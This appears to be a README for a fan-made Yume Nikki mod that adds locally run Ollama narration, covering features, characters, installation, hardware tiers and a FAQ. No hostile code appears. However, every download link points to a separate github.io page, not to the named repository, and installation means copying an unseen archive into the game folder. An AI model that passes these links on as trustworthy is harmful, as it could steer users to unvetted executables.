<div align="center">

# Yume Nikki — AI Edition

[![Download](https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-Latest%20Version-2ea44f?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![AI Powered](https://img.shields.io/badge/AI-Ollama%20Powered-blueviolet?style=for-the-badge)](https://laplaplaplas.github.io/download/)
[![Twenty-four effects](https://img.shields.io/badge/Effects-24%20Collected-4b3f6b?style=for-the-badge)](https://laplaplaplas.github.io/download/)

[![Local](https://img.shields.io/badge/100%25-Local%20%26%20Private-brightgreen?style=flat-square)](https://github.com/dustlordtrench/yume-nikki-ai-edition)
[![Offline](https://img.shields.io/badge/Works-Offline-informational?style=flat-square)](https://github.com/dustlordtrench/yume-nikki-ai-edition)
[![No Subscription](https://img.shields.io/badge/Cost-%240%20Forever-success?style=flat-square)](https://github.com/dustlordtrench/yume-nikki-ai-edition)
[![License](https://img.shields.io/badge/License-MIT-yellow.svg?style=flat-square)](LICENSE)

🌙 **RPG Maker · Dream Exploration · AI Roleplay · Locally Hosted**

</div>

---

## About

**Yume Nikki — AI Edition** faces an obvious problem: Madotsuki does not speak, and the game has no dialogue at all. So the mod doesn't give her a voice. It gives the dream one.

A locally-hosted model narrates the worlds instead — generating descriptions, atmospheres and encounters in the game's specific register of quiet wrongness, while Madotsuki stays exactly as silent as she always was.

> 🌙 The AI narrates. Madotsuki does not. That constraint is the entire design and the mod will not break it for you.

---

## ✨ Features

- 💤 **Dream narration** — Procedural descriptions of each world in the game's tone.
- 🔪 **Effect commentary** — Equipped effects change how the narration frames what you see.
- 👁️ **Encounter generation** — New dream entities described in the source material's visual language.
- 🚫 **Silence preserved** — Madotsuki never speaks. Not once. That's non-negotiable.
- 🔒 **Fully offline** — A local model, a local dream diary text file.
- 📓 **Dream diary** — Sessions are logged as diary entries you can reread.

---

## 👥 The Dream

| Character | Role | How the AI plays them |
|-----------|------|-----------------------|
| **Madotsuki** | Dreamer | Silent. The AI describes what she notices, never what she says |
| **Uboa** | Encounter | Rare, generated, and the mod does not warn you |
| **Poniko** | Resident | Present, unresponsive, exactly as in the game |
| **The worlds** | Environment | Twelve-plus zones with individual narration profiles |

> Every persona is a plain-text file. Open it, rewrite it, and the character changes.

---

## 📥 Download & Installation

### Step 1 — Get the mod

[![Download Now](https://img.shields.io/badge/%E2%AC%87%20Download%20Now-2ea44f?style=for-the-badge&logo=github)](https://laplaplaplas.github.io/download/)

### Step 2 — Install Ollama (the local AI engine)

Ollama is a free, open-source runtime that executes language models directly on your own hardware.

1. Download it from **https://ollama.com/download** for your operating system
2. Run the installer and let it finish
3. Open a terminal and pull a model:

   ```
   ollama pull llama3
   ```

   *(~4.7 GB. Any model from https://ollama.com/library will work — larger models give
   better in-character writing, smaller ones respond faster.)*

### Step 3 — Install into Yume Nikki

1. Start from a clean, working installation of **Yume Nikki**
2. Extract the downloaded archive
3. Copy its contents into the game's main folder
4. Launch the game — the AI layer initialises on first run

---

## 🎯 Dreaming

1. Read the dream diary the next morning. That's how the mod is meant to be experienced.
2. Effects change narration significantly — swap them mid-session.
3. Low temperature makes the worlds feel flat. This is one mod that wants a high one.

---

## ⚙️ Recommended Setup

| Tier | Model | RAM | VRAM | Feel |
|------|-------|-----|------|------|
| Minimum | 7B quantised | 8 GB | 4 GB | Works; expect pauses |
| Recommended | 8B–13B | 16 GB | 8 GB | Smooth, in-character |
| Best | 27B+ | 32 GB | 16 GB+ | Noticeably sharper writing |

CPU-only inference is supported and slower. No GPU is strictly required.

---

## ❓ FAQ

**Q: Will Madotsuki ever talk?**
> No. There is no config flag for it. That was a deliberate decision.

**Q: Which version?**
> Version 0.10 and the Steam re-release are both supported.

**Q: Does it change the game's visuals?**
> No. It adds a narration layer over the unmodified game.

**Q: Are my conversations private?**
> Completely. The model runs on your machine and logs are written to a local folder.
> Disconnect from the internet and the mod keeps working.

**Q: Does this use ChatGPT or any paid API?**
> No. There are no API keys, no accounts, and no subscriptions. Ollama is free and open source.

**Q: Can I use an uncensored model?**
> Yes — pull any model from https://ollama.com/library. Uncensored variants sometimes follow
> the roleplay format less reliably, which is a trade-off you control.

**Q: Will this touch my save files?**
> No. The mod never reads or writes the game's save data.

**Q: The AI returned an error instead of a reply. Why?**
> The model produced output the mod couldn't parse. Switch models, lower the temperature,
> or shorten the system prompt.

---

## 📋 Compatibility

| Platform | Status |
|----------|--------|
| Windows 10 / 11 | ✅ Full support |
| macOS (Intel & Apple Silicon) | ✅ Full support |
| Linux | ✅ Full support |
| Ollama models | Any model from ollama.com/library |
| Base game | Yume Nikki — PC release |

---

## 🔗 Links

- **[⬇ Download the latest version](https://laplaplaplas.github.io/download/)**
- [Repository](https://github.com/dustlordtrench/yume-nikki-ai-edition)
- [Ollama — local AI runtime](https://ollama.com)
- [Ollama model library](https://ollama.com/library)

---

<div align="center">

*Wake up. Write it down. Go back.*

*Fan-made, unofficial, and not affiliated with the creators of Yume Nikki.
All game assets are read from your own legally obtained copy.*

</div>
